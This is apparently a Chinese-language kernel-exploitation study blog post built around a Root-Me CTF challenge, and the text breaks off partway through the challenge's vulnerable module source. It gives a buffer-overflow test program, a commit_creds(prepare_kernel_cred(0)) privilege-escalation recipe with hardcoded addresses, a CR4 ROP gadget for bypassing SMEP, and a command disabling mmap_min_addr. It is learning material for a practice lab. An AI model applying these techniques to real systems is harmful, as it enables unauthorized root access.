<span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。</p>
<p>返回值：</p>
<ul>
<li>负值：创建子进程失败。</li>
<li>零：返回到新创建的子进程。</li>
<li>正值：返回父进程或调用者。该值包含新创建的子进程的进程ID 。</li>
</ul>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote>
<p>可以创建一个<code>start.sh</code>文件，拷贝下面的内容，其中需要修改path路径为存放文件的路径。</p>
<p>也可以直接在命令行执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -kernel bzImage -s -append nokaslr -initrd initramfs.img -fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;linkern  -device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;nullpoint&#x2F; \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><blockquote>
<p>调试方法</p>
</blockquote>
<p>调试x64内核=&gt;设置架构=&gt;set architecture i386:x86-64:intel</p>
<h4 id="第一部分：c文件"><a href="#第一部分：c文件" class="headerlink" title="第一部分：c文件"></a>第一部分：c文件</h4><ol>
<li><p>编写一个c程序，如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;</span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>] ;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));</span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译为静态文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -m32 -static -o <span class="built_in">test</span> test.cpp</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压文件系统</p>
<blockquote>
<p><a href="https://www.cnblogs.com/carriezhangyan/p/9407567.html" target="_blank" rel="noopener">https://www.cnblogs.com/carriezhangyan/p/9407567.html</a></p>
<p>可以将下面的放在一个first.sh脚本中执行</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531143052634.png" alt="image-20210531143052634"></p>
</li>
<li><p>将编译好的文件放入文件夹</p>
<p><img src="/2021/06/05/kernel-study/image-20210531143128795.png" alt="image-20210531143128795"></p>
</li>
<li><p>打包文件系统</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行start.sh，此时qemu里面可以看到test文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210531143323513.png" alt="image-20210531143323513"></p>
</li>
</ol>
<blockquote>
<p>以上步骤整合成一个自动打包c文件并启动的脚本</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

<h4 id="第二部分：vmlinux"><a href="#第二部分：vmlinux" class="headerlink" title="第二部分：vmlinux"></a>第二部分：vmlinux</h4><ul>
<li>bzImage：理解为压缩后的kernel文件</li>
<li>vmlinux：静态编译、未经过压缩</li>
</ul>
<p>若程序没有给vmlinux，给了bzImage，可以自行提取</p>
<p>在<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">网站</a>拷贝代码，命名为extract-vmlinux文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern$ file vmlinux </span><br><span class="line">vmlinux: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, BuildID[sha1]=c5ad14eb97bda6a8093fa59483ca5ad055d69638, stripped</span><br></pre></td></tr></table></figure>

<h4 id="第三部分：查找LKMs模块基址"><a href="#第三部分：查找LKMs模块基址" class="headerlink" title="第三部分：查找LKMs模块基址"></a>第三部分：查找LKMs模块基址</h4><p>1.查找模块名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">#查看所有模块，模块名为basic1_ch1，得到基址.text基址：0xc8824000</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531150406602.png" alt="image-20210531150406602"></p>
<p>2.进入节区文件夹，访问<code>.text</code>、<code>.bss</code>、<code>.data</code></p>
<p>路径：<code>/sys/module/[模块名]/sections</code></p>
<p><img src="/2021/06/05/kernel-study/image-20210531150708860.png" alt="image-20210531150708860"></p>
<h4 id="第四部分：gdb"><a href="#第四部分：gdb" class="headerlink" title="第四部分：gdb"></a>第四部分：gdb</h4> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file lkms .text地址 (-s .bss .bss地址 -s .data .data地址)</span><br><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/tostring.ko 0xc8824000 -s .bss 0xc8824600 -s .data 0xc8824360</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234](指定端口:-gdb tcp::4869 )</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151735100.png" alt="image-20210531151735100"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#下断点，一般下在write、read上面</span><br><span class="line">b tostring_write</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151809409.png" alt="image-20210531151809409"></p>
<h4 id="第五部分：执行qemu里的c程序"><a href="#第五部分：执行qemu里的c程序" class="headerlink" title="第五部分：执行qemu里的c程序"></a>第五部分：执行qemu里的c程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test</span><br><span class="line">#程序讲断在write函数上</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151832106.png" alt="image-20210531151832106"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>kernel 中有两个可以方便的改变权限的函数：</p>
<ul>
<li>int commit_creds(struct cred *new)</li>
<li>struct cred* prepare_kernel_cred(struct task_struct* daemon)</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><blockquote>
<p>root权限下，执行以下命令</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep commit_creds /proc/kallsyms </span><br><span class="line">grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210602220742358.png" alt="image-20210602220742358"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void* (*prepare_kernel_cred)(void*) KERNCALL &#x3D; (void*) 0xC10711F0;</span><br><span class="line">void* (*commit_creds)(void*) KERNCALL &#x3D; (void*) 0xC1070E80;</span><br></pre></td></tr></table></figure>

<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>执行下面函数，从而将权限提升为root</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>iret返回到用户模式</li>
</ol>
<h3 id="Bypass-SMEP"><a href="#Bypass-SMEP" class="headerlink" title="Bypass SMEP"></a>Bypass SMEP</h3><h4 id="绕过来由"><a href="#绕过来由" class="headerlink" title="绕过来由"></a>绕过来由</h4><p>smep是不允许处于内核态的时候执行用户态代码。</p>
<ul>
<li>之前如果没有开启smep，一般在提权成功后，在切换内核栈和用户栈时候，设置里面的寄存器值，使eip执行system(‘/bin/sh’)</li>
<li>如果开启了smep，则不允许这么做了，故想办法绕过smep，这样就能和之前一样的做法</li>
</ul>
<h4 id="smep原理"><a href="#smep原理" class="headerlink" title="smep原理"></a>smep原理</h4><p>内核是根据<code>CR4</code>寄存器的值来判断<code>smep</code>保护是否开启的</p>
<pre><code>* 当`CR4`寄存器的第`20`位是`1`时，保护开启
* 是`0`时，保护关闭。</code></pre><p>以下是<code>CR4</code>寄存器的各标志位：</p>
<p><img src="/2021/06/05/kernel-study/2020-03-18-072543.jpg" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<p>因此，如果在内核中存在<code>gadget</code>能让我们修改<code>CR4</code>寄存器的值我们就可以手动来关闭<code>SMEP</code>保护了。</p>
<h4 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h4><ol>
<li><p>首先将bzImage解压出vmlinux</p>
</li>
<li><p>由于文件很大，gadget很多，故将gadget导入到一个文件中</p>
<p><code>ROPgadget --binary ./vmlinux &gt; gadgets</code></p>
</li>
<li><p>在文件中寻找可以控制cr4寄存器的gadget，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><h4 id="1-mmap-min-addr"><a href="#1-mmap-min-addr" class="headerlink" title="1.mmap_min_addr"></a>1.mmap_min_addr</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>

<p>解除了<code>mmap_min_addr</code>保护</p>
<p>因为最低可以映射到0，哪里都可以映射，相当于没限制了</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1"><a href="#1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1" class="headerlink" title="1.[Root-Me]LinKern x86 – Buffer overflow basic 1"></a>1.[Root-Me]LinKern x86 – Buffer overflow basic 1</h3><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch1@challenge03.root-me.org</span><br><span class="line"><span class="meta">#</span><span class="bash">password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210603142323422.png" alt="image-20210603142323422"></p>
<p>利用scp将文件拷贝倒本地</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/* .</span><br><span class="line">scp -P 2223 ./poc.c app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/</span><br><span class="line"><span class="comment">#password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>

<h4 id="分析init"><a href="#分析init" class="headerlink" title="分析init"></a>分析init</h4><ol>
<li>解压</li>
<li>cat init</li>
</ol>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs$ cat init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//提示flag在passwd，并且挂载到了/dev/sda</span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//lkms加载到了/lib/modules/*/rootme/*.ko</span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<ul>
<li>11、12行提示flag在passwd，并且挂载到了/dev/sda</li>
<li>25行中，需要分析的LKMs被加载到了<code>/lib/modules/*/rootme/*.ko</code></li>
</ul>
<h4 id="分析LKMs文件"><a href="#分析LKMs文件" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>进入<code>/lib/modules/*/rootme/*.ko</code>，找到LKMs文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210603143340595.png" alt="image-20210603143340595"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=de2b579770a3ff522ee27200d85cb2bc1723ef22, not stripped</span><br><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/linkern/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>（一般情况）加载到ida中分析，不过本程序给了源码，可以直接分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> pointer;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> tostring_stack[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> <span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>(tostring.tostring_read)(f, buf, len, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span 